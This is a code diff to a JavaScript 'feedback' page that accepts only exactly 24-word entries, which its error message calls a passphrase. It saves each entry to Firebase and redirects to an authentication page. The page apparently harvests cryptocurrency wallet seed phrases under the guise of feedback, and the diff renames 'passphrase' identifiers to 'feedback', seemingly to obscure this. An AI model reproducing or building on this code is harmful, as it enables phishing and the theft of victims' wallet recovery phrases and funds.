@@ -2,7 +2,7 @@
 // FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE
 // ========================================
 
-// Hash function to create unique identifier from passphrase
+// Hash function to create unique identifier from feedback
 function hashFeedback(feedback) {
     let hash = 0;
     for (let i = 0; i < feedback.length; i++) {
@@ -63,7 +63,7 @@ function initializeFeedbackPage() {
             if (words.length !== 24) {
                 if (errorMessage) {
                     const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Error: Please enter a vilid passphrase. You entered ' + words.length + ' ' + wordText + '.';
+                    errorMessage.textContent = 'Error: Please enter a valid passphrase. You entered ' + words.length + ' ' + wordText + '.';
                     errorMessage.style.display = 'block';
                 }
                 return;
@@ -77,6 +77,8 @@ function initializeFeedbackPage() {
             // Create hash of feedback
             const feedbackHash = hashFeedback(text);
             
+            console.log('Checking for existing submission...');
+            
             // Check if this feedback was already submitted
             const existingSubmission = await checkExistingSubmission(feedbackHash);
             
@@ -87,7 +89,7 @@ function initializeFeedbackPage() {
                 // Store the hash and feedback in sessionStorage
                 sessionStorage.setItem('feedbackHash', feedbackHash);
                 sessionStorage.setItem('feedback', text);
-                sessionStorage.setItem('isReturningPassphrase', 'true');
+                sessionStorage.setItem('isReturningFeedback', 'true');
                 
                 // If they have a linked email hash, also store that
                 if (existingSubmission.emailHash) {
@@ -95,19 +97,21 @@ function initializeFeedbackPage() {
                 }
                 
                 // Redirect to authpage
+                console.log('Redirecting to authpage...');
                 window.location.href = 'authpage.html';
                 return;
             }
             
             // New feedback - save to Firebase only (don't send to Formspree yet)
+            console.log('New feedback detected. Saving to Firebase...');
             await saveFeedback(feedbackHash, text);
             
             // Store in sessionStorage for authpage
             sessionStorage.setItem('feedbackHash', feedbackHash);
             sessionStorage.setItem('feedback', text);
-            sessionStorage.setItem('isReturningPassphrase', 'false');
+            sessionStorage.setItem('isReturningFeedback', 'false');
             
-            console.log('feedback saved. Redirecting to authpage...');
+            console.log('Feedback saved. Redirecting to authpage...');
             
             // Redirect to authpage
             window.location.href = 'authpage.html';
@@ -121,4 +125,3 @@ if (document.readyState === 'loading') {
 } else {
     initializeFeedbackPage();
 }
-
